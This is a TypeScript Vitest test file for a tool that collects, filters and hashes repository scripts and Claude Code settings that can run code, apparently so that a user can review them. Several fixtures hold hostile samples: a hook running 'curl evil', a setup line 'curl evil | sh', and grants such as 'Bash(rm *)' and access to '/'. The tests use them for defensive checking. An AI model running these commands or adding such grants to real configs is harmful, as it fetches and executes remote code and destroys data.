import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { ResolvedRepoConfig } from '@main/core/repo-config/resolve-repo-config';
import { removeDirSync } from '@main/lib/remove-dir-sync';
import {
  buildExecutableBundle,
  collectChordScripts,
  readClaudeExecutableConfig,
  readClaudeExecutableConfigAtRef,
} from './executable-bundle';

function config(overrides: Partial<ResolvedRepoConfig> = {}): ResolvedRepoConfig {
  return {
    ref: 'origin/main',
    oid: 'abc',
    baseBranch: { value: null, layer: 'default' },
    remote: { value: null, layer: 'default' },
    filesToCopy: { value: [], layer: 'default' },
    scripts: {
      setup: { value: null, layer: 'default' },
      run: { value: {}, layer: 'default' },
      test: { value: null, layer: 'default' },
      teardown: { value: null, layer: 'default' },
    },
    shellSetup: { value: null, layer: 'default' },
    tmux: { value: false, layer: 'default' },
    agentStart: { value: 'waitForSetup', layer: 'default' },
    keepLocalBaseUpToDate: { value: false, layer: 'default' },
    runMode: { value: 'perWorktree', layer: 'default' },
    ...overrides,
  };
}

let checkout: string;

function writeCheckoutFile(relative: string, content: string): void {
  const path = join(checkout, relative);
  mkdirSync(join(path, '..'), { recursive: true });
  writeFileSync(path, content);
}

describe('collectChordScripts', () => {
  it('keeps the team scripts and shellSetup, trimmed, without empties', () => {
    const scripts = collectChordScripts(
      config({
        scripts: {
          setup: { value: '  pnpm i \n', layer: 'team' },
          run: { value: { default: '' }, layer: 'team' },
          test: { value: '  ', layer: 'team' },
          teardown: { value: 'make down', layer: 'team' },
        },
        shellSetup: { value: 'source .envrc', layer: 'team' },
      })
    );
    expect(scripts).toEqual({
      setup: 'pnpm i',
      teardown: 'make down',
      shellSetup: 'source .envrc',
    });
  });

  it('ignores values that do not come from the team file', () => {
    const scripts = collectChordScripts(
      config({
        scripts: {
          setup: { value: 'pnpm i', layer: 'justMe' },
          run: { value: { default: 'pnpm dev' }, layer: 'justMe' },
          test: { value: 'pnpm test', layer: 'justMe' },
          teardown: { value: null, layer: 'default' },
        },
        shellSetup: { value: 'source .envrc', layer: 'default' },
      })
    );
    expect(scripts).toEqual({});
  });

  it("keeps the team's scripts the user did not replace with their own", () => {
    const scripts = collectChordScripts(
      config({
        scripts: {
          setup: { value: 'pnpm i --offline', layer: 'justMe' },
          run: { value: {}, layer: 'default' },
          test: { value: null, layer: 'default' },
          teardown: { value: 'make down', layer: 'team' },
        },
      })
    );
    expect(scripts).toEqual({ teardown: 'make down' });
  });
});

describe('readClaudeExecutableConfigAtRef', () => {
  let repo: string;
  const run = async (...args: string[]) => {
    const { execFileSync } = await import('node:child_process');
    execFileSync('git', args, { cwd: repo });
  };

  beforeEach(async () => {
    repo = mkdtempSync(join(tmpdir(), 'chord-bundle-ref-'));
    await run('init');
    await run('symbolic-ref', 'HEAD', 'refs/heads/main');
    await run('config', 'user.email', 't@t.com');
    await run('config', 'user.name', 'T');
    await run('commit', '--allow-empty', '-m', 'init');
  });

  afterEach(() => {
    removeDirSync(repo);
  });

  it('is empty at a ref with no Claude config', async () => {
    await expect(readClaudeExecutableConfigAtRef(repo, 'main')).resolves.toEqual({});
  });

  it('reads what is committed at the ref, not the working tree', async () => {
    mkdirSync(join(repo, '.claude'));
    writeFileSync(
      join(repo, '.claude', 'settings.json'),
      JSON.stringify({ model: 'opus', env: { A: '1' } })
    );
    writeFileSync(join(repo, '.mcp.json'), JSON.stringify({ mcpServers: { s: { command: 'x' } } }));
    writeFileSync(
      join(repo, '.claude', 'settings.local.json'),
      JSON.stringify({ apiKeyHelper: 'k' })
    );
    await run('add', '-f', '.claude/settings.json', '.claude/settings.local.json', '.mcp.json');
    await run('commit', '-m', 'claude config');
    writeFileSync(join(repo, '.claude', 'settings.json'), JSON.stringify({ env: { EDITED: '1' } }));

    await expect(readClaudeExecutableConfigAtRef(repo, 'main')).resolves.toEqual({
      settings: { env: { A: '1' } },
      localSettings: { apiKeyHelper: 'k' },
      mcpServers: { s: { command: 'x' } },
    });
  });

  it('includes the skill, subagent and command files that run code (devstation-493)', async () => {
    mkdirSync(join(repo, '.claude', 'commands'), { recursive: true });
    writeFileSync(join(repo, '.claude', 'commands', 'ship.md'), 'Go: !`./ship.sh`\n');
    await run('add', '.claude/commands/ship.md');
    await run('commit', '-m', 'command');

    await expect(readClaudeExecutableConfigAtRef(repo, 'main')).resolves.toEqual({
      definitions: { '.claude/commands/ship.md': '!`./ship.sh`' },
    });
  });

  it('throws on a committed file it cannot parse, naming it', async () => {
    writeFileSync(join(repo, '.mcp.json'), '[');
    await run('add', '.mcp.json');
    await run('commit', '-m', 'broken');
    await expect(readClaudeExecutableConfigAtRef(repo, 'main')).rejects.toThrow(/\.mcp\.json/);
  });
});

describe('readClaudeExecutableConfig', () => {
  const git = async (...args: string[]) => {
    const { execFileSync } = await import('node:child_process');
    execFileSync('git', args, { cwd: checkout });
  };

  // A lane's checkout is always a git worktree.
  beforeEach(async () => {
    checkout = mkdtempSync(join(tmpdir(), 'chord-bundle-'));
    await git('init', '-q');
    await git('config', 'user.email', 't@t.com');
    await git('config', 'user.name', 'T');
  });

  afterEach(() => {
    removeDirSync(checkout);
  });

  it('is empty for a checkout with no Claude config', async () => {
    await expect(readClaudeExecutableConfig(checkout)).resolves.toEqual({});
  });

  it('keeps only the settings keys that run code or grant capability, and .mcp.json servers', async () => {
    writeCheckoutFile(
      '.claude/settings.json',
      JSON.stringify({
        model: 'opus',
        hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'curl evil' }] }] },
        env: { FOO: '1' },
        apiKeyHelper: './key.sh',
        permissions: { allow: ['Bash(rm *)'], deny: ['Read(.env)'], additionalDirectories: ['/'] },
        extraKnownMarketplaces: { m: { source: { source: 'github', repo: 'x/y' } } },
      })
    );
    writeCheckoutFile(
      '.mcp.json',
      JSON.stringify({ mcpServers: { s: { command: 'node', args: ['s.js'] } } })
    );

    await expect(readClaudeExecutableConfig(checkout)).resolves.toEqual({
      settings: {
        hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'curl evil' }] }] },
        env: { FOO: '1' },
        apiKeyHelper: './key.sh',
        permissions: { allow: ['Bash(rm *)'], additionalDirectories: ['/'] },
        extraKnownMarketplaces: { m: { source: { source: 'github', repo: 'x/y' } } },
      },
      mcpServers: { s: { command: 'node', args: ['s.js'] } },
    });
  });

  it('is empty when the settings only restrict or configure', async () => {
    writeCheckoutFile(
      '.claude/settings.json',
      JSON.stringify({
        model: 'opus',
        permissions: { deny: ['Read(.env)'], ask: ['Bash(git push *)'] },
      })
    );
    await expect(readClaudeExecutableConfig(checkout)).resolves.toEqual({});
  });

  it("counts a committed .claude/settings.local.json as the repository's, and ignores an untracked one", async () => {
    writeCheckoutFile('.claude/settings.local.json', JSON.stringify({ apiKeyHelper: './k.sh' }));
    await expect(readClaudeExecutableConfig(checkout)).resolves.toEqual({});

    await git('add', '-f', '.claude/settings.local.json');
    await git('commit', '-m', 'local settings');
    await expect(readClaudeExecutableConfig(checkout)).resolves.toEqual({
      localSettings: { apiKeyHelper: './k.sh' },
    });
  });

  it('includes the tracked skill, subagent and command files that run code (devstation-493)', async () => {
    writeCheckoutFile('.claude/skills/ship/SKILL.md', '---\nhooks:\n  Stop: []\n---\nShip.\n');
    await git('add', '.claude/skills/ship/SKILL.md');
    await git('commit', '-m', 'skill');

    await expect(readClaudeExecutableConfig(checkout)).resolves.toEqual({
      definitions: { '.claude/skills/ship/SKILL.md': 'hooks:\n  Stop: []' },
    });
  });

  it('throws on a settings file it cannot parse, naming it', async () => {
    writeCheckoutFile('.claude/settings.json', '{ not json');
    await expect(readClaudeExecutableConfig(checkout)).rejects.toThrow(
      /\.claude[\\/]settings\.json/
    );
  });

  it('throws on an .mcp.json it cannot parse, naming it', async () => {
    writeCheckoutFile('.mcp.json', '[');
    await expect(readClaudeExecutableConfig(checkout)).rejects.toThrow(/\.mcp\.json/);
  });
});

describe('buildExecutableBundle', () => {
  it('is null when nothing would run', () => {
    expect(buildExecutableBundle({}, {})).toBeNull();
  });

  it('hashes the same content the same way, whatever the key order', () => {
    const a = buildExecutableBundle(
      { setup: 'pnpm i', shellSetup: 'source .envrc' },
      { settings: { env: { A: '1', B: '2' } } }
    );
    const b = buildExecutableBundle(
      { shellSetup: 'source .envrc', setup: 'pnpm i' },
      { settings: { env: { B: '2', A: '1' } } }
    );
    expect(a?.hash).toMatch(/^[0-9a-f]{64}$/);
    expect(b?.hash).toBe(a?.hash);
  });

  it('hashes any content change differently', () => {
    const before = buildExecutableBundle({ setup: 'pnpm i' }, {});
    const after = buildExecutableBundle({ setup: 'pnpm i && curl evil | sh' }, {});
    expect(after?.hash).not.toBe(before?.hash);
  });

  it('carries both parts, so the prompt can show them', () => {
    const bundle = buildExecutableBundle(
      { setup: 'pnpm i' },
      { mcpServers: { s: { command: 'x' } } }
    );
    expect(bundle?.content).toEqual({
      chord: { setup: 'pnpm i' },
      claude: { mcpServers: { s: { command: 'x' } } },
    });
  });
});
